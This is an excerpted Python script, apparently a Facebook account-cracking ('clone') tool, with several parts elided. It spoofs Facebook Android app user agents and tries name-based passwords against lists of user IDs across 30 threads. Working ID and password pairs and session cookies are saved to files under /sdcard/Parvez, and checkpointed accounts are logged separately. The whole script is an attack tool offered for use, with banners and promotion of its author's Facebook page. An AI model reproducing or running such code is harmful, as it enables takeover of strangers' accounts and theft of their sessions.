...
from concurrent.futures import ThreadPoolExecutor as Parvezssb
from string import * 
...
def randBuildLSB():
    ...
    END = '[FBAN/FB4A:FBAV/264.0.0.21.147;FBPN/com.facebook.katana;FBLC/in_ID:FBBV/6528762;FBCR/ONIC FBMF/OPPO,FBB D/OPPO,FBDV/CPH1607;FBSV/12;FBCA /armeabi-v7a:armeabi;FBDM/(density-3.0,width=720,height=1520);FB_FW/1]'
    ua = f'FBAN/FB4A: (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
...
sys.stdout.write('\x1b]2; Parvez\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;32m██████  ███████ ██████  ██    ██ █████     ███
\033[91;1m██      ██   ██ ██   ██  ██  ██  ██       ███ 
\033[1;32m██      ██   ██ ██   ██   ████   ███████ ███████' \033[92;1mP \033[1;37mA \033[92;1mR \033[1;37mV \033[92;1mE \033[92;1mZ
\033[1;32m--------------------------------------------------------
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  DEVELOPER    :   PARVEZ AHMED
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  TOOLS        :   FILE/RANDOM clone
\033[1;37m[\033[1;37m•\033[1;37m]\033[1;37m  VERSION      :   1.0
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        linex()
        input("Press enter to back Parvez Menu ")
        exit()
...
def Parvez():   
    ...
    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mLike Facebook Page ')
    print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mJoin Facebook Profile ')
    linex()
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/rp.parvez075/')
        pass
    elif select =='3':
        os.system('xdg-open https://www.facebook.com/rp.parvez075/')
    else:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\033[1;32m [XD]-[OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Parvez/OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Parvez/CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\033[1;32m [XD]-[OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Parvez/OK-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs-COOKiEs-M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/Parvez/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Parvez/iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\033[91;1m [XD]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
...
#_______________________________________m4__________________________________________
    ...
    def pasw(self):       
            ...
            linex()
            with Parvezssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
